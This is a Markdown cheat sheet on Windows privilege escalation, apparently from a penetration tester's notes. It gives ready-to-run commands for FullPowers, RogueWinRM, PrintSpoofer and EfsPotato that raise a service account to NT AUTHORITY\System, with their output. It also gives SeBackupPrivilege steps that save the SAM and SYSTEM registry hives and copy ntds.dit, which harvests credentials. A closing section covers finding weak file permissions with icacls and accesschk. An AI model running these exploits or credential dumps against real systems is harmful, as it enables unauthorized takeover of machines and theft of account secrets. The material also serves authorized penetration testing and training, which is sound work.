# Windows Privilege

- [Windows Privilege](#windows-privilege)
  - [Service Account](#service-account)
    - [Service Privileges](#service-privileges)
    - [Privilege escalation - Enable `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`](#privilege-escalation---enable-seimpersonateprivilegeseassignprimarytokenprivilege)
    - [Privilege escalation - To `NT AUTHORITY\System`](#privilege-escalation---to-nt-authoritysystem)
      - [RogueWinRM](#roguewinrm)
      - [PrintSpoofer](#printspoofer)
      - [EfsPotato](#efspotato)
  - [User Privilege](#user-privilege)
    - [Default Privilege](#default-privilege)
    - [Privilege exploitable](#privilege-exploitable)
      - [`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`](#seimpersonateprivilege-or-seassignprimarytokenprivilege)
      - [`SeBackupPrivilege`](#sebackupprivilege)
      - [`SeRestorePrivilege`](#serestoreprivilege)
  - [File Permissions](#file-permissions)
    - [Weak permissions - accesschk](#weak-permissions---accesschk)
  - [Sources](#sources)

## Service Account

Service Account:

- `nt authority\local service`
- `nt authority\network service`

### Service Privileges

```raw
nt authority\local service

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
```

### Privilege escalation - Enable `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`

```cmd
C:\ProgramData\FullPowers.exe -c cmd.exe
```

```raw
nt authority\local service

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Privilege escalation - To `NT AUTHORITY\System`

#### RogueWinRM

Note: winrm must be **disable** on the system

```cmd
RogueWinRM.exe -p c:\Windows\System32\cmd.exe
```

```raw
nt authority\system
```

#### PrintSpoofer

```cmd
PrintSpoofer.exe  -i -c cmd.exe
```

```raw
nt authority\system
```

#### EfsPotato

Build code for `x64`:

```cmd
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
```

Build code for `x86`:

```cmd
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 EfsPotato.cs
```

Exploit:

```cmd
EfsPotato.exe whoami
```

```raw
nt authority\system
```

## User Privilege

### Default Privilege

```raw
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### Privilege exploitable

#### `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

- juicy-potato
- RogueWinRM (needs winrm disabled)
- SweetPotato
- PrintSpoofer

#### `SeBackupPrivilege`

Source: <https://github.com/giuliano108/SeBackupPrivilege>

```powershell
C:\scripts> reg save hklm\sam sam
C:\scripts> reg save hklm\system system

PS C:\scripts> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\scripts> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\scripts> Get-SeBackupPrivilege
PS C:\scripts> Copy-FileSeBackupPrivilege c:\Windows\NTDS\ntds.dit ntds.dit
```

#### `SeRestorePrivilege`

```text
Write access control to any file on the system, regardless of the files ACL.
```

## File Permissions

> Simple right

```raw
F (full access)
M (modify access)
RX (read and execute access)
R (read-only access)
W (write-only access)
```

> Read permission

```cmd
icacls FILE_OR_DIR
```

> Set Permissions

```cmd
icacls "FILE_OR_DIR" /grant USERNAME:PERMISSIONS
```

> Set Full Permissions

```text
icacls "FILE_OR_DIR" /grant USERNAME:F
```

### Weak permissions - accesschk

Group `Users`:

```cmd
accesschk64.exe -w -s -u -d "Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Users" "C:\Windows"
```

Permission of `Authenticated Users`:

```cmd
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Windows"
```

Permission of `Everyone`:

```cmd
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files"
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Everyone" "C:\Windows"
```

## Sources

- <https://github.com/itm4n/FullPowers>
- <https://github.com/itm4n/PrintSpoofer>
- <https://github.com/antonioCoco/RogueWinRM>
- <https://github.com/zcgonvh/EfsPotato>
